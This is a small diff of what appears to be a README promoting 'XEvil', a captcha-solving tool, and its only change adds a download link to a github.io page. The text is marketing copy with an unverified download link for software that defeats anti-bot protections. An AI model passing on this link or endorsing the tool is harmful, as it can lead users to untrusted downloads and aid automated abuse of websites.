@@ -2,7 +2,7 @@
 
 XEvil is a powerful captcha solver with unbeatable accuracy and speed. It utilizes cutting-edge algorithms and AI technology to solve various types of captchas.
 
-# [Download](https://.github.io/file/i7f5114kk)
+# [Download](https://astophi.github.io/file/i7f5114kk)
 
 ---
 
